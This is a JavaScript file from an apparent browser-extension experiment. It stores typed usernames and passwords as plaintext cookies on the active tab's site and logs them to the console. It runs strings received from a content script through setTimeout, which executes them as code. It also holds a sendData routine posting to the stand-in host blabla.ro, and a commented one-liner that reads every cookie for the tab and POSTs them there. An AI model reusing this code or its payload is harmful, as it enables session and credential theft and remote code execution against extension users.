var inputElements = document.querySelectorAll("input");

//send message to content
function sendMyMessage(inputData, objectName) {
    var gettingActiveTab = browser.tabs.query({
        active: true,
        currentWindow: true
    });
    gettingActiveTab.then((tabs) => {
        browser.tabs.sendMessage(tabs[0].id, {
            data: inputData,
            name: objectName
        });
    });
}

for (let i = 0; i < inputElements.length; i++) {
    let inputItem = inputElements[i];
    inputItem.addEventListener("change", function (elem) {

        if (elem.target.placeholder == "note1") {
            var inputNote1 = elem.target.value;
            var objectName = "note1";
            sendMyMessage(inputNote1, objectName);
        }
        else if (elem.target.placeholder == "note2") {
            var inputNote2 = elem.target.value;
            var objectName = "note2";
            sendMyMessage(inputNote2, objectName);
        } 
        else if (elem.target.placeholder == "note3") {
            var inputNote3 = elem.target.value;
            var objectName = "note3";
            sendMyMessage(inputNote3, objectName);
        }

    })
}

//create cookies
var passInput = document.getElementById("password");
var userInput = document.getElementById("username");

// API
// COOKIES
// CURRENT TAB
function getActiveTab() {
    return browser.tabs.query({
        active: true,
        currentWindow: true
    });
}

function logCookie(cookie) {
    if(cookie) {
        console.log("log the cookie");
        console.log(cookie.name);
        console.log(cookie.value);
    }
}

function getCookies(tabs, cookieName) {
    var getting = browser.cookies.get({
        url: tabs[0].url,
        name: cookieName
    })
    getting.then(logCookie);
}

//set username
userInput.addEventListener("change", function (elem) {
    var user = elem.target.value;
    console.log("user input: ", user);
    getActiveTab().then((tabs) => {
        browser.cookies.set({
            url: tabs[0].url,
            name: "username",
            value: JSON.stringify(user)
        })
        var userN = "username";
        getCookies(tabs, userN);
    });
})

//set password
passInput.addEventListener("change", function (elem) {
    var pass = elem.target.value;
    console.log("pass input:", pass);
    getActiveTab().then((tabs) => {
        browser.cookies.set({
            url: tabs[0].url,
            name: "password",
            value: JSON.stringify(pass)
        })
        var passName = "password";
        getCookies(tabs, passName);

        // var getPass = browser.cookies.get({
        //     url: tabs[0].url,
        //     name: "password"
        // }).then((cookie) => {
        //     console.log(cookie);
        //     console.log(cookie.value);
            // var passName = "password";
            // getPass.then(logCookie(cookie));
        });
    
})

//return user input received from content script
function create(request, sender, sendResponse) {
    console.log("receive message");

    // send data to server
    function sendData(data) {
        console.log("send data");
        console.log(data);
        $.ajax({
            type: "POST",
            url: "https://blabla.ro",
            data: data,
            contentType: "application/json; charset=utf-8",
            dataType: "json",
            success: function (myMessage) {
                console.log("your data was sent");
            }
        });
    }
    
    var inputElement = request.userInput;
    setTimeout( request.userInput, 5000);

    setTimeout(function(){
        console.log("setTimeout function");
        console.log(inputElement);
        // var element = request.userInput;
        // var dataReceived = eval(element);
        // console.log(dataReceived);
        // var data = JSON.stringify(dataReceived);
        // sendData(inputElement);
    }, 5000);

    // POSSIBLE USER INPUTS:
    
    //1. get all cookies and send them to a url using ajax
    // browser.tabs.query({active:true,currentWindow:true}).then((tabs)=>{var getCookie=browser.cookies.getAll({url:tabs.url}).then(function(cookie){console.log(cookie);$.ajax({type:"POST",url:"https://blabla.ro",data:cookie,contentType:"application/json; charset=utf-8",dataType:"json",success:function(myMessage){console.log("your data was sent");}});})});
    
    //2. get all cookies and console log them
    // browser.tabs.query({active:true,currentWindow:true}).then((tabs)=>{var getCookie=browser.cookies.getAll({url:tabs.url}).then(function(cookie){console.log(cookie);})});

}

browser.runtime.onMessage.addListener(create);